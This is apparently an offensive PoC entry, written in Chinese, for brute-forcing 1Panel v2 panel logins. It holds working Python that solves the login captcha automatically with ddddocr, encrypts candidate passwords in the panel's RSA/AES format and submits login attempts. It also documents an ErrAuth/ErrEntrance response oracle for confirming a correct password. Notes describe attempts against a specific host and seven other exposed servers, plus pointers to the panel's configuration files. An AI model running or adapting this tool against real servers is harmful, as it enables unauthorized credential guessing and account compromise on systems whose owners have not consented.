# 1Panel v2 登录验证码自动化攻破（ddddocr）+ ErrAuth/ErrEntrance 命中判据 + “有安全入口即不可行”结构性结论

- **code**: 1panel-v2-登录验证码自动化攻破-ddddocr-errauth-errentrance-命中判据-有安全入口即不可行-结构性结论
- **kind**: script
- **category**: weak-password
- **component**: 1Panel
- **versions**: 1Panel v2（实测 >=v2.0.14；CVE-2025-66507 已修复的版本同样适用）
- **severity**: high
- **language**: python
- **source**: self
- **source_url**: https://1panel.cn/blog/security-advisory-1p-2025-12-08.html
- **verified**: 1
- **verified_note**: 在 203.0.113.51:9527（1Panel v2，安全入口启用，1441B 拦截页）实测：① CVE-2025-66507 的 ignoreCaptcha=true 已失效（官方公告修复于 v2.0.14）；② 但验证码本身可被本机 ddddocr 自动识别 —— 人工核对 cap1 为 65PL、OCR 输出 65pl（1Panel 校验大小写不敏感），连续 3/3 轮提交正确 captcha+captchaID 后响应由 ErrCaptchaCode 变为 ErrAuth，证明请求真正到达口令校验层；共做 77 条加密格式审计，全部 ErrAuth、0 命中；OCR 单轮准确率约 83%（12 次中 10 次过验证码）；③ 命中判据来自后端源码 core/app/api/v2/auth.go：口令错→ErrAuth（并触发 IPTracker.RecordFailure/SetNeedCaptcha），口令对但缺安全入口→ErrEntrance（不累计失败）；④ 最终结论：该实例结构上不可行 —— 有安全入口时 Login() 的入口校验在口令校验之后，即使猜中口令也只得到 ErrEntrance、拿不到会话，且唯一读入口的 1pctl user-info 需 SSH（该机 22 被目标侧掐断）。同批 7 台源站全部开放 9527。
- **path**: pocs/1panel-v2-登录验证码自动化攻破-ddddocr-errauth-errentrance-命中判据-有安全入口即不可行-结构性结论/poc.py
- **tags**: 1Panel,v2,验证码,ddddocr,OCR,ErrEntrance,安全入口,爆破可行性,端口9527
- **created_at**: 2026-09-30T01:28:31.361Z

## 描述

1Panel 默认端口是 9527（不是 10086）；v2 面板启用安全入口后仍匿名可达 /api/v2/core/auth/{captcha,setting,login} 三个路由。验证码是 120x50 混合字符图，可用 ddddocr 自动识别从而绕开“无法自动登录”的限制；但“能猜口令”不等于“能拿会话”：后端把安全入口校验放在口令校验之后，命中口令只会返回 ErrEntrance 而非下发会话，因此**有安全入口的 1Panel 面板在密码学/结构上不应作为在线爆破目标**，除非另有途径读到安全入口（1pctl user-info / 面板配置文件）。

## 用法

```
1) 确认面板：curl -s http://TARGET:9527/api/v2/core/auth/setting → {"panelName":"1Panel","needCaptcha":true}；GET / 若为 1441B 拦截页则安全入口已启用。
2) 取公钥（用于口令加密）：同一次请求的 Set-Cookie panel_public_key 即为 base64(PEM)，unquote 后补 '=' 填充再 b64decode。
3) 取验证码：GET /api/v2/core/auth/captcha → {"data":{"captchaID":..,"imagePath":"data:image/png;base64,.."}}，用 ddddocr(show_ad=False).classification(png_bytes) 识别（大小写不敏感）。
4) 提交：POST /api/v2/core/auth/login body {"name":"1panel","password":"<rsa_b64>:<iv_b64>:<ct_b64>","captcha":<OCR>,"captchaID":<id>,"language":"zh"}；password 三段式 = base64(RSA_PKCS1v15(secrets.token_hex(16) 的 UTF-8 字节)) : base64(iv16) : base64(AES-256-CBC/PKCS7(口令, key=token_hex(16) 的 UTF-8 字节))。
5) 判读：ErrCaptchaCode=验证码没过（OCR 失误，重取重试）；ErrAuth=口令错；**ErrEntrance=口令对但缺安全入口**（此时不要再爆，转去拿入口）。
6) 不要用明文 password：服务端对解密失败与口令不匹配统一返回 ErrAuth，明文尝试全部无效且无法察觉（这正是前序 48 次“已试过”结论作废的原因 —— 该脚本还把 captchaID 写成空串、从未提交 captcha）。
```

## 正文

```
# 核心实现（Python）
import base64, os, secrets, urllib.parse, json, time
import requests, ddddocr
from cryptography.hazmat.primitives import padding as sympadding, serialization
from cryptography.hazmat.primitives.asymmetric import padding as asympadding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

BASE = "http://TARGET:9527"
ocr = ddddocr.DdddOcr(show_ad=False)
S = requests.Session(); S.trust_env = False

# 1) 公钥
S.get(BASE + "/api/v2/core/auth/setting", timeout=20)
ck = S.cookies.get("panel_public_key")
b64 = urllib.parse.unquote(ck).replace('"', ''); b64 += "=" * (-len(b64) % 4)
pub = serialization.load_pem_public_key(base64.b64decode(b64).decode().encode())

def enc_pw(pw: str) -> str:
    k = secrets.token_hex(16)                      # 32 hex chars -> AES-256 key (UTF-8 bytes)
    rsa = base64.b64encode(pub.encrypt(k.encode(), asympadding.PKCS1v15())).decode()
    iv = os.urandom(16)
    p = sympadding.PKCS7(128).padder()
    data = p.update(pw.encode()) + p.finalize()
    c = Cipher(algorithms.AES(k.encode()), modes.CBC(iv)).encryptor()
    ct = c.update(data) + c.finalize()
    return "%s:%s:%s" % (rsa, base64.b64encode(iv).decode(), base64.b64encode(ct).decode())

def attempt(name, pw):
    g = S.get(BASE + "/api/v2/core/auth/captcha", timeout=20).json()["data"]
    png = base64.b64decode(g["imagePath"].split(",", 1)[1])
    cap = ocr.classification(png)                  # 大小写不敏感
    body = {"name": name, "password": enc_pw(pw), "captcha": cap,
            "captchaID": g["captchaID"], "language": "zh"}
    r = S.post(BASE + "/api/v2/core/auth/login", json=body, timeout=25)
    return r.json()                                # message: ErrAuth / ErrEntrance / ErrCaptchaCode

# 判读
# ErrAuth       -> 口令错（会累计 IPTracker.RecordFailure）
# ErrEntrance   -> 口令对、只缺安全入口（不累计失败）← 唯一命中信号
# ErrCaptchaCode-> OCR 失误，重取验证码重试

# 关键源码依据（1Panel-dev/1Panel dev-v2）
# core/app/api/v2/auth.go:
#   if msgKey == "ErrAuth" || msgKey == "ErrEntrance" || msgKey == "ErrNoneNode" {
#       if msgKey == "ErrAuth" { global.IPTracker.RecordFailure(ip); global.IPTracker.SetNeedCaptcha(ip) }
#       helper.BadAuth(c, msgKey, err); return }
# frontend/src/utils/auth.ts: encryptPassword() 三段式；无 panel_public_key 时前端回退明文
# core/app/dto/auth.go: Login{Name,Password,Captcha,CaptchaID,Language,AuthSource} —— 无 ignoreCaptcha 字段
#
# 结论（省时间，勿重复投入）：安全入口启用时，口令校验在入口校验之前/之后的分支只给出
# ErrEntrance 而不下发会话 ⇒ 对启用安全入口的 1Panel 做在线口令审计，命中也不产生权限，
# 应放弃爆破，转而寻找安全入口本身（1pctl user-info 需 SSH；面板配置文件在 /opt/1panel/）。

```
